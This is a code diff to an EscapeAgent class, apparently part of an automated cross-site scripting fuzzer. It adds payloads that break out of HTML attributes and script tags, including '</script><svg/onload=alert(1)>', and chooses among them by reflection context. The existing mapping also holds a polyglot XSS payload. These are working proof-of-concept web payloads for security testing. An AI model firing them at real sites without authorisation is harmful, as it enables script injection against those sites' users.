@@ -13,7 +13,10 @@ class EscapeAgent:
             "parenthesis",        # ( )
             "curly_brace",        # { }
             "square_bracket",     # [ ]
-            "polyglot_html_attr_js" # Polyglot context escape
+            "polyglot_html_attr_js", # Polyglot context escape
+            "break_attr_double",   # ">
+            "break_attr_single",   # '>
+            "break_js_script"      # </script><svg/onload=alert(1)>
         ]
         self.mapping = {
             "angle_bracket": "><",
@@ -23,11 +26,19 @@ class EscapeAgent:
             "parenthesis": "()",
             "curly_brace": "{}",
             "square_bracket": "[]",
-            "polyglot_html_attr_js": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(/*  */ alert(1) )//'>"
+            "polyglot_html_attr_js": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(/*  */ alert(1) )//'>",
+            "break_attr_double": '"><',
+            "break_attr_single": "'> <",
+            "break_js_script": "</script><svg/onload=alert(1)>"
         }
 
-    def act(self, action_name=None):
-        """Chooses a context-breaking action."""
+    def act(self, action_name=None, context_type=None):
+        """Chooses a context-breaking action based on the identified reflection context."""
+        if context_type == "attribute":
+             return random.choice([self.mapping["break_attr_double"], self.mapping["break_attr_single"]])
+        if context_type == "script":
+             return self.mapping["break_js_script"]
+
         if not action_name:
             action_name = random.choice(self.rules)
         return self.mapping.get(action_name, "><")
